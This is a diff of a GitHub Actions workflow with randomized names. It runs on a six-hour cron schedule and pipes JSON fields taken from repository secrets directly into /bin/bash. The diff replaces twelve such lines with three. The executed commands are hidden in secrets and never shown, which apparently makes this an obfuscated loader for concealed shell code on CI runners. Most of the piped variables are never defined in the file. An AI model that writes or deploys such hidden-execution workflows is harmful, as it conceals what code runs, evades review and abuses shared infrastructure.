@@ -1,9 +1,9 @@
 name: glisteningpartridges
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 3/6 * * *'
+    - cron: '6 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,18 +12,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: glisteningpartridges
         env:
-          wi73515: ${{ secrets.wi73515 }}
+          cblny00913: ${{ secrets.cblny00913 }}
         run: |
-          echo $wi73515 | jq -r .cojn3 | /bin/bash
-          echo $moppa899 | jq -r .l4843 | /bin/bash
-          echo $mpgrj3897 | jq -r .czrro3 | /bin/bash
-          echo $nccu3422 | jq -r .tbklk952 | /bin/bash
-          echo $r873 | jq -r .vfs716 | /bin/bash
-          echo $ba10326 | jq -r .yknq789 | /bin/bash
-          echo $rgk65 | jq -r .rmjej08887 | /bin/bash
-          echo $hypd289 | jq -r .q7 | /bin/bash
-          echo $edh8484 | jq -r .l0546 | /bin/bash
-          echo $iga7 | jq -r .h698 | /bin/bash
-          echo $g40 | jq -r .vimmn68534 | /bin/bash
-          echo $u29 | jq -r .hk2 | /bin/bash
+          echo $cblny00913 | jq -r .yqdg1904 | /bin/bash
+          echo $mypxn9921 | jq -r .t75 | /bin/bash
+          echo $sydis355 | jq -r .ds389 | /bin/bash
 
